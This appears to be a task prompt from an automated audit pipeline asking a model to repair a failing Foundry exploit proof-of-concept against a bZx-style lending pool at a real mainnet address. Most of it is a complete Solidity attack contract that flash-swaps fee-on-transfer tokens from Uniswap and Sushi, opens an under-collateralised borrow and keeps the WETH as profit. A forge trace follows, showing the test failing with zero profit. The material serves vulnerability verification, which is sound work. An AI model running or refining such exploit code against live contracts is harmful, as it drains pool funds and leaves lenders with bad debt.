You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Nominal-amount accounting overcredits deposits and collateral for fee-on-transfer assets
- claim: `_mintToken`, `_totalDeposit`, and both `_verifyTransfers` variants use user-declared amounts (`depositAmount`, `loanTokenSent`, `collateralTokenSent`) for minting and downstream loan accounting, but they never measure the actual token balance delta received after `transferFrom`.
- impact: If any supported asset is deflationary, fee-on-transfer, or otherwise delivers less than the nominal amount, lenders can receive too many pool shares for too little underlying and borrowers can open or top up positions with less real collateral/funding than the accounting assumes, creating dilution, bad debt, or pool insolvency.
- exploit_paths: ["Deposit a fee-on-transfer `loanTokenAddress` via `mint`; shares are minted from `depositAmount` even if the pool receives less.", "Open `borrow` or `marginTrade` using a fee-on-transfer collateral token or loan token contribution; `sentAmounts` still report the pre-fee amount to `bZxContract`."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ILoanTokenPool {
    struct LoanOpenData {
        bytes32 loanId;
        uint256 principal;
        uint256 collateral;
    }

    function loanTokenAddress() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function loanParamsIds(uint256 index) external view returns (bytes32);

    function mint(address receiver, uint256 depositAmount) external returns (uint256);
    function burn(address receiver, uint256 burnAmount) external returns (uint256);

    function getBorrowAmountForDeposit(
        uint256 depositAmount,
        uint256 initialLoanDuration,
        address collateralTokenAddress
    ) external view returns (uint256 borrowAmount);

    function borrow(
        bytes32 loanId,
        uint256 withdrawAmount,
        uint256 initialLoanDuration,
        uint256 collateralTokenSent,
        address collateralTokenAddress,
        address borrower,
        address receiver,
        bytes calldata loanDataBytes
    ) external payable returns (LoanOpenData memory);

    function marginTrade(
        bytes32 loanId,
        uint256 leverageAmount,
        uint256 loanTokenSent,
        uint256 collateralTokenSent,
        address collateralTokenAddress,
        address trader,
        bytes calldata loanDataBytes
    ) external payable returns (LoanOpenData memory);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract BalanceProbe {
    address public immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function pull(address token, address from, uint256 amount) external returns (bool) {
        require(msg.sender == owner, "ONLY_OWNER");
        return _callOptionalReturn(token, abi.encodeWithSignature("transferFrom(address,address,uint256)", from, address(this), amount));
    }

    function sweep(address token, address to) external {
        require(msg.sender == owner, "ONLY_OWNER");
        uint256 amount = IERC20Minimal(token).balanceOf(address(this));
        if (amount == 0) {
            return;
        }
        _callOptionalReturn(token, abi.encodeWithSignature("transfer(address,uint256)", to, amount));
    }

    function _callOptionalReturn(address target, bytes memory data) internal returns (bool ok) {
        (bool success, bytes memory returndata) = target.call(data);
        if (!success) {
            return false;
        }
        return returndata.length == 0 || abi.decode(returndata, (bool));
    }
}

contract FlawVerifier {
    address public constant TARGET = 0xB983E01458529665007fF7E0CDdeCDB74B967Eb6;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address public constant UNI_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address public constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address public constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address public constant MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
    address public constant BAT = 0x0D8775F648430679A709E98d2b0Cb6250d2887EF;
    address public constant ZRX = 0xE41d2489571d322189246DaFA5ebDe1F4699F498;
    address public constant REP = 0x1985365e9f78359a9B6AD760e32412f4a445E862;
    address public constant YFI = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;
    address public constant BZRX = 0x56d811088235F11C8920698a204A5010a788f4b3;

    address public constant STA = 0xa7DE087329BFcda5639247F96140f9DAbe3DeED1;
    address public constant PAXG = 0x45804880De22913dAFE09f4980848ECE6EcbAf78;
    address public constant XAUT = 0x68749665FF8D2d112Fa859AA293F07A622782F38;

    uint256 internal constant MIN_PROFIT = 0.1 ether;
    uint256 internal constant BORROW_DURATION = 28 days;

    ILoanTokenPool internal constant POOL = ILoanTokenPool(TARGET);

    struct FlashContext {
        address pair;
        address token;
        address repaymentToken;
        uint256 repaymentAmount;
        uint8 mode;
    }

    struct Route {
        address pair;
        address quoteToken;
        uint256 reserveToken;
        uint256 reserveQuote;
        bool tokenIs0;
    }

    BalanceProbe internal immutable probe;

    bool public executed;
    bool public profitAchieved;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    string public exploitPathUsed;
    string public status;

    address internal _profitToken;
    uint256 internal _profitAmount;
    FlashContext internal _flashContext;

    constructor() {
        probe = new BalanceProbe();
        _profitToken = WETH;
        status = "not-run";
    }

    function executeOnOpportunity() external {
        require(!executed, "ALREADY_EXECUTED");
        executed = true;
        _profitToken = WETH;

        address loanToken = POOL.loanTokenAddress();
        bool touchedAnyPath;

        // The finding's lender-dilution mint path only works when the pool underlying itself
        // is fee-on-transfer. On this fork the underlying is WETH, so only the borrower /
        // margin-trade branch is realistically exploitable.
        if (_isPlausibleFeeToken(loanToken) && _attemptFlashMintPath(loanToken)) {
            touchedAnyPath = true;
            _finalize();
            return;
        }

        address[13] memory collateralCandidates;
        collateralCandidates[0] = PAXG;
        collateralCandidates[1] = XAUT;
        collateralCandidates[2] = STA;
        collateralCandidates[3] = USDT;
        collateralCandidates[4] = BZRX;
        collateralCandidates[5] = WBTC;
        collateralCandidates[6] = LINK;
        collateralCandidates[7] = MKR;
        collateralCandidates[8] = BAT;
        collateralCandidates[9] = ZRX;
        collateralCandidates[10] = REP;
        collateralCandidates[11] = YFI;
        collateralCandidates[12] = DAI;

        for (uint256 index = 0; index < collateralCandidates.length; index++) {
            address collateralToken = collateralCandidates[index];
            if (collateralToken == address(0) || collateralToken == loanToken) {
                continue;
            }

            // Strategy requirement: prefer direct execution with verifier-held assets first.
            if (_attemptExistingBalanceBorrowPath(collateralToken)) {
                _finalize();
                return;
            }

            touchedAnyPath = true;

            if (_attemptFlashBorrowPath(collateralToken)) {
                _finalize();
                return;
            }
        }

        if (profitAchieved) {
            _finalize();
            return;
        }

        if (hypothesisValidated) {
            status = "validated-without-positive-net-profit";
            return;
        }

        hypothesisRefuted = true;
        status = touchedAnyPath ? "fee-token-paths-probed-but-not-self-funding" : "no-supported-fee-token-path-discovered";
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        _handleFlashCallback(sender, amount0, amount1);
    }

    function sushiCall(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        _handleFlashCallback(sender, amount0, amount1);
    }

    function _handleFlashCallback(address sender, uint256 amount0, uint256 amount1) internal {
        FlashContext memory context = _flashContext;
        require(context.pair != address(0), "NO_CONTEXT");
        require(msg.sender == context.pair, "BAD_PAIR");
        require(sender == address(this), "BAD_SENDER");

        uint256 nominalAmount = amount0 != 0 ? amount0 : amount1;
        uint256 receivedAmount = _balanceOf(context.token, address(this));
        require(receivedAmount != 0 && receivedAmount <= nominalAmount, "BAD_FLASH_AMOUNT");

        if (context.mode == 1) {
            _executeMintPathInCallback(context.token, nominalAmount, receivedAmount);
        } else {
            _executeBorrowPathInCallback(context.token, nominalAmount, receivedAmount);
        }

        _flashContext = FlashContext(address(0), address(0), address(0), 0, 0);
    }

    function _executeMintPathInCallback(address loanToken, uint256 nominalAmount, uint256 receivedAmount) internal {
        bool taxed = nominalAmount > receivedAmount || _detectTransferFromFee(loanToken, receivedAmount);
        require(taxed, "LOAN_TOKEN_NOT_FEE_ON_TRANSFER");

        uint256 spendableAmount = _balanceOf(loanToken, address(this));
        uint256 beforeLoanToken = spendableAmount;

        _forceApprove(loanToken, TARGET, spendableAmount);

        uint256 sharesBefore = POOL.balanceOf(address(this));
        uint256 mintedShares;
        try POOL.mint(address(this), spendableAmount) returns (uint256 minted) {
            mintedShares = minted;
        } catch {
            revert("MINT_PATH_FAILED");
        }

        if (mintedShares == 0) {
            uint256 sharesAfter = POOL.balanceOf(address(this));
            if (sharesAfter > sharesBefore) {
                mintedShares = sharesAfter - sharesBefore;
            }
        }
        require(mintedShares != 0, "NO_SHARES");

        hypothesisValidated = true;
        exploitPathUsed = "mint(depositAmount) overcredits fee-on-transfer loanToken deposits";

        try POOL.burn(address(this), mintedShares) returns (uint256) {
            uint256 afterLoanToken = _balanceOf(loanToken, address(this));
            require(afterLoanToken > beforeLoanToken, "NO_MINT_SPREAD");
            _profitToken = loanToken;
            _profitAmount = afterLoanToken - beforeLoanToken;
            profitAchieved = _profitAmount >= MIN_PROFIT;
        } catch {
            revert("BURN_PATH_FAILED");
        }
    }

    function _executeBorrowPathInCallback(address collateralToken, uint256 nominalAmount, uint256 receivedAmount) internal {
        // The root cause is the nominal `collateralTokenSent` accounting on transferFrom into bZx.
        // We therefore allow realistic fee-token candidates even if the pair->verifier transfer is
        // not itself taxed, because the exploitable accounting step is the verifier->bZx transferFrom.
        bool plausibleFeeCollateral = nominalAmount > receivedAmount || _isPlausibleFeeToken(collateralToken);
        require(plausibleFeeCollateral, "COLLATERAL_NOT_FEE_ON_TRANSFER");

        uint256 spendableAmount = _balanceOf(collateralToken, address(this));
        require(spendableAmount != 0, "NO_COLLATERAL");

        _forceApprove(collateralToken, TARGET, spendableAmount);

        uint256 repaymentWeth = _wethCostForRepayment(_flashContext.repaymentToken, _flashContext.repaymentAmount);
        require(repaymentWeth != type(uint256).max, "NO_REPAYMENT_ROUTE");

        uint256 borrowAmount = POOL.getBorrowAmountForDeposit(spendableAmount, BORROW_DURATION, collateralToken);
        require(borrowAmount > repaymentWeth + MIN_PROFIT, "NOT_PROFITABLE");

        uint256 safeBorrowAmount = borrowAmount - (borrowAmount / 1000);
        uint256 wethBefore = _balanceOf(WETH, address(this));

        // Public-liquidity steps are limited to: (1) sourcing taxed collateral through an AMM
        // flash swap and (2) optionally swapping a slice of borrowed WETH into the flash pair's
        // quote token for repayment. The causality remains unchanged: bZx credits the nominal
        // `collateralTokenSent` even though transferFrom delivers less real collateral.
        try POOL.borrow(
            bytes32(0),
            safeBorrowAmount,
            BORROW_DURATION,
            spendableAmount,
            collateralToken,
            address(this),
            address(this),
            ""
        ) returns (ILoanTokenPool.LoanOpenData memory) {
            hypothesisValidated = true;
            exploitPathUsed = "borrow(collateralTokenSent) nominal accounting using flash-sourced fee collateral";
        } catch {
            revert("BORROW_PATH_FAILED");
        }

        uint256 wethAfterBorrow = _balanceOf(WETH, address(this));
        require(wethAfterBorrow > wethBefore, "NO_WETH_BORROWED");

        if (_flashContext.repaymentToken == WETH) {
            _safeTransfer(WETH, _flashContext.pair, _flashContext.repaymentAmount);
        } else {
            _swapWethForExactToken(_flashContext.repaymentToken, _flashContext.repaymentAmount);
            _safeTransfer(_flashContext.repaymentToken, _flashContext.pair, _flashContext.repaymentAmount);
        }

        uint256 remainingWeth = _balanceOf(WETH, address(this));
        require(remainingWeth >= MIN_PROFIT, "PROFIT_BELOW_THRESHOLD");

        profitAchieved = true;
        _profitToken = WETH;
        _profitAmount = remainingWeth;
    }

    function _attemptExistingBalanceBorrowPath(address collateralToken) internal returns (bool) {
        if (!_isPlausibleFeeToken(collateralToken)) {
            return false;
        }

        uint256 heldCollateral = _balanceOf(collateralToken, address(this));
        if (heldCollateral == 0) {
            return false;
        }

        uint256 borrowAmount = POOL.getBorrowAmountForDeposit(heldCollateral, BORROW_DURATION, collateralToken);
        if (borrowAmount <= MIN_PROFIT) {
            return false;
        }

        _forceApprove(collateralToken, TARGET, heldCollateral);

        uint256 safeBorrowAmount = borrowAmount - (borrowAmount / 1000);
        uint256 wethBefore = _balanceOf(WETH, address(this));
        try POOL.borrow(
            bytes32(0),
            safeBorrowAmount,
            BORROW_DURATION,
            heldCollateral,
            collateralToken,
            address(this),
            address(this),
            ""
        ) returns (ILoanTokenPool.LoanOpenData memory) {
            uint256 wethAfter = _balanceOf(WETH, address(this));
            if (wethAfter > wethBefore && wethAfter - wethBefore >= MIN_PROFIT) {
                hypothesisValidated = true;
                profitAchieved = true;
                _profitToken = WETH;
                _profitAmount = wethAfter - wethBefore;
                exploitPathUsed = "borrow(collateralTokenSent) nominal accounting using verifier-held fee collateral";
                return true;
            }
        } catch {}

        return false;
    }

    function _attemptFlashMintPath(address loanToken) internal returns (bool) {
        Route memory route = _findBestRoute(loanToken, WETH);
        if (route.pair == address(0) || route.quoteToken != WETH) {
            return false;
        }

        uint256[4] memory denominators = [uint256(200), 100, 50, 20];
        for (uint256 index = 0; index < denominators.length; index++) {
            uint256 amountOut = route.reserveToken / denominators[index];
            if (amountOut <= 1) {
                continue;
            }

            uint256 repaymentWeth = _getAmountIn(amountOut, route.reserveQuote, route.reserveToken);
            if (repaymentWeth == 0) {
                continue;
            }

            _flashContext = FlashContext(route.pair, loanToken, WETH, repaymentWeth, 1);

            try IUniswapV2Pair(route.pair).swap(
                route.tokenIs0 ? amountOut : 0,
                route.tokenIs0 ? 0 : amountOut,
                address(this),
                abi.encode(uint256(1))
            ) {
                if (profitAchieved) {
                    return true;
                }
            } catch {
                _flashContext = FlashContext(address(0), address(0), address(0), 0, 0);
            }
        }

        return false;
    }

    function _attemptFlashBorrowPath(address collateralToken) internal returns (bool) {
        address[4] memory preferredQuotes;
        preferredQuotes[0] = WETH;
        preferredQuotes[1] = USDC;
        preferredQuotes[2] = USDT;
        preferredQuotes[3] = DAI;

        for (uint256 routeIndex = 0; routeIndex < preferredQuotes.length; routeIndex++) {
            Route memory route = _findBestRoute(collateralToken, preferredQuotes[routeIndex]);
            if (route.pair == address(0)) {
                continue;
            }

            // Smaller probes first reduce AMM slippage; larger probes follow if the fee is too
            // small to monetize at tiny sizes.
            uint256[10] memory denominators = [uint256(10000), 5000, 2500, 2000, 1000, 500, 250, 100, 50, 20];
            for (uint256 index = 0; index < denominators.length; index++) {
                uint256 amountOut = route.reserveToken / denominators[index];
                if (amountOut <= 1) {
                    continue;
                }

                uint256 repaymentAmount = _getAmountIn(amountOut, route.reserveQuote, route.reserveToken);
                if (repaymentAmount == 0) {
                    continue;
                }

                uint256 quotedBorrow = POOL.getBorrowAmountForDeposit(amountOut, BORROW_DURATION, collateralToken);
                uint256 quotedRepaymentWeth = _wethCostForRepayment(route.quoteToken, repaymentAmount);
                if (quotedRepaymentWeth == type(uint256).max || quotedBorrow <= quotedRepaymentWeth + MIN_PROFIT) {
                    continue;
                }

                _flashContext = FlashContext(route.pair, collateralToken, route.quoteToken, repaymentAmount, 2);

                try IUniswapV2Pair(route.pair).swap(
                    route.tokenIs0 ? amountOut : 0,
                    route.tokenIs0 ? 0 : amountOut,
                    address(this),
                    abi.encode(uint256(2))
                ) {
                    if (profitAchieved) {
                        return true;
                    }
                } catch {
                    _flashContext = FlashContext(address(0), address(0), address(0), 0, 0);
                }
            }
        }

        return false;
    }

    function _findBestRoute(address token, address preferredQuote) internal view returns (Route memory best) {
        address[2] memory factories;
        factories[0] = UNI_V2_FACTORY;
        factories[1] = SUSHI_FACTORY;

        for (uint256 j = 0; j < factories.length; j++) {
            address pair = _getPair(factories[j], token, preferredQuote);
            if (pair == address(0)) {
                continue;
            }

            (uint256 reserveToken, uint256 reserveQuote, bool tokenIs0) = _pairReserves(pair, token, preferredQuote);
            if (reserveToken == 0 || reserveQuote == 0) {
                continue;
            }

            if (reserveToken > best.reserveToken) {
                best = Route(pair, preferredQuote, reserveToken, reserveQuote, tokenIs0);
            }
        }
    }

    function _wethCostForRepayment(address repaymentToken, uint256 repaymentAmount) internal view returns (uint256) {
        if (repaymentAmount == 0) {
            return 0;
        }
        if (repaymentToken == WETH) {
            return repaymentAmount;
        }

        address pair = _pairFor(repaymentToken, WETH);
        if (pair == address(0)) {
            return type(uint256).max;
        }

        (uint256 reserveToken, uint256 reserveWeth,) = _pairReserves(pair, repaymentToken, WETH);
        return _getAmountIn(repaymentAmount, reserveWeth, reserveToken);
    }

    function _swapWethForExactToken(address tokenOut, uint256 amountOut) internal returns (uint256 wethSpent) {
        address pair = _pairFor(tokenOut, WETH);
        require(pair != address(0), "NO_WETH_REPAY_ROUTE");

        (uint256 reserveTokenOut, uint256 reserveWeth, bool tokenOutIs0) = _pairReserves(pair, tokenOut, WETH);
        wethSpent = _getAmountIn(amountOut, reserveWeth, reserveTokenOut);
        require(wethSpent != 0, "BAD_WETH_REPAY_QUOTE");

        _safeTransfer(WETH, pair, wethSpent);
        IUniswapV2Pair(pair).swap(
            tokenOutIs0 ? amountOut : 0,
            tokenOutIs0 ? 0 : amountOut,
            address(this),
            new bytes(0)
        );
    }

    function _pairFor(address tokenA, address tokenB) internal view returns (address pair) {
        pair = _getPair(UNI_V2_FACTORY, tokenA, tokenB);
        if (pair != address(0)) {
            return pair;
        }
        return _getPair(SUSHI_FACTORY, tokenA, tokenB);
    }

    function _getPair(address factory, address tokenA, address tokenB) internal view returns (address pair) {
        (bool success, bytes memory returndata) = factory.staticcall(
            abi.encodeWithSelector(IUniswapV2Factory.getPair.selector, tokenA, tokenB)
        );
        if (!success || returndata.length < 32) {
            return address(0);
        }
        pair = abi.decode(returndata, (address));
    }

    function _pairReserves(
        address pair,
        address asset,
        address quoteAsset
    ) internal view returns (uint256 reserveAsset, uint256 reserveQuote, bool assetIsToken0) {
        address token0 = IUniswapV2Pair(pair).token0();
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        if (token0 == asset) {
            require(IUniswapV2Pair(pair).token1() == quoteAsset, "BAD_PAIR_ASSET");
            return (uint256(reserve0), uint256(reserve1), true);
        }
        require(token0 == quoteAsset, "BAD_PAIR_QUOTE");
        return (uint256(reserve1), uint256(reserve0), false);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountOut == 0 || reserveIn == 0 || reserveOut == 0 || amountOut >= reserveOut) {
            return 0;
        }
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function _loanParamsId(address collateralToken, bool isTorqueLoan) internal view returns (bytes32) {
        return POOL.loanParamsIds(uint256(keccak256(abi.encodePacked(collateralToken, isTorqueLoan))));
    }

    function _isPlausibleFeeToken(address token) internal pure returns (bool) {
        return token == STA || token == PAXG || token == XAUT || token == USDT || token == BZRX;
    }

    function _finalize() internal {
        if (_profitToken == address(0)) {
            _profitToken = WETH;
        }

        uint256 realized = _balanceOf(_profitToken, address(this));
        if (_profitToken == WETH) {
            _profitAmount = realized;
        } else if (_profitAmount == 0) {
            _profitAmount = realized;
        }

        profitAchieved = _profitAmount >= MIN_PROFIT;
        hypothesisValidated = hypothesisValidated || profitAchieved;
        status = profitAchieved ? "profit-achieved" : "profit-below-threshold";
    }

    function _detectTransferFromFee(address token, uint256 balance) internal returns (bool) {
        uint256 probeAmount = balance / 20;
        if (probeAmount == 0) {
            probeAmount = balance / 2;
        }
        if (probeAmount == 0) {
            return false;
        }

        _forceApprove(token, address(probe), probeAmount);

        uint256 beforeProbe = _balanceOf(token, address(probe));
        bool ok = probe.pull(token, address(this), probeAmount);
        if (!ok) {
            return false;
        }

        uint256 afterProbe = _balanceOf(token, address(probe));
        probe.sweep(token, address(this));

        if (afterProbe <= beforeProbe) {
            return false;
        }

        return (afterProbe - beforeProbe) < probeAmount;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSignature("approve(address,uint256)", spender, 0));
        _callOptionalReturn(token, abi.encodeWithSignature("approve(address,uint256)", spender, amount));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        require(_callOptionalReturn(token, abi.encodeWithSignature("transfer(address,uint256)", to, amount)), "TRANSFER_FAILED");
    }

    function _balanceOf(address token, address account) internal view returns (uint256 amount) {
        (bool success, bytes memory returndata) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!success || returndata.length < 32) {
            return 0;
        }
        amount = abi.decode(returndata, (uint256));
    }

    function _callOptionalReturn(address target, bytes memory data) internal returns (bool ok) {
        (bool success, bytes memory returndata) = target.call(data);
        if (!success) {
            return false;
        }
        return returndata.length == 0 || abi.decode(returndata, (bool));
    }
}

```

forge stdout (tail):
```
23d5
    │   │   │   ├─ [3947] 0xD8Ee69652E4e4838f2531732a46d1f7F584F0b7f::d1979fb0(000000000000000000000000b983e01458529665007ff7e0cddecdb74b967eb6000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2) [staticcall]
    │   │   │   │   ├─ [3069] 0x103936aEC861d7CFb2d5c7F9dd1a671085f5fDd3::d1979fb0(000000000000000000000000b983e01458529665007ff7e0cddecdb74b967eb6000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000f5ee4e8ba2d9132d000000000000000000000000000000000000000000000000000000005f5dda550000000000000000000000000000000000000000000000005cf1e76bf0d2f31d00000000000000000000000000000000000000000000000001ee5451aa2c711c0000000000000000000000000000000000000000000000008ac7230489e800000000000000000000000000000000000000000000000000d88d225f745be6e5cc
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000f5ee4e8ba2d9132d000000000000000000000000000000000000000000000000000000005f5dda550000000000000000000000000000000000000000000000005cf1e76bf0d2f31d00000000000000000000000000000000000000000000000001ee5451aa2c711c0000000000000000000000000000000000000000000000008ac7230489e800000000000000000000000000000000000000000000000000d88d225f745be6e5cc
    │   │   │   ├─ [1983] 0xD8Ee69652E4e4838f2531732a46d1f7F584F0b7f::4a1e88fe(000000000000000000000000b983e01458529665007ff7e0cddecdb74b967eb6000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2) [staticcall]
    │   │   │   │   ├─ [1134] 0x4Cb1292d6a860ca1B0991FC7DfA30a656ef7e7C7::4a1e88fe(000000000000000000000000b983e01458529665007ff7e0cddecdb74b967eb6000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000d88d225f745be6e5cc
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000d88d225f745be6e5cc
    │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xB983E01458529665007fF7E0CDdeCDB74B967Eb6) [staticcall]
    │   │   │   │   └─ ← [Return] 3137544108688829373693 [3.137e21]
    │   │   │   ├─ [1983] 0xD8Ee69652E4e4838f2531732a46d1f7F584F0b7f::4a1e88fe(000000000000000000000000b983e01458529665007ff7e0cddecdb74b967eb6000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2) [staticcall]
    │   │   │   │   ├─ [1134] 0x4Cb1292d6a860ca1B0991FC7DfA30a656ef7e7C7::4a1e88fe(000000000000000000000000b983e01458529665007ff7e0cddecdb74b967eb6000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000d88d225f745be6e5cc
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000d88d225f745be6e5cc
    │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xB983E01458529665007fF7E0CDdeCDB74B967Eb6) [staticcall]
    │   │   │   │   └─ ← [Return] 3137544108688829373693 [3.137e21]
    │   │   │   └─ ← [Return] 178166748159083596201 [1.781e20]
    │   │   └─ ← [Return] 178166748159083596201 [1.781e20]
    │   ├─ [564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xdAC17F958D2ee523a2206206994597C13D831ec7, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852
    │   ├─ [381] 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852::token0() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [504] 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852::getReserves() [staticcall]
    │   │   └─ ← [Return] 165661060811399695508747 [1.656e23], 64096916654652 [6.409e13], 1599988056 [1.599e9]
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x6B175474E89094C44Da98b954EedeAC495271d0F, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x6B175474E89094C44Da98b954EedeAC495271d0F, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   └─ ← [Stop]
    ├─ [470] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 10852715 [1.085e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 13.07s (12.83s CPU time)

Ran 1 test suite in 13.16s (13.07s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 14913175)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
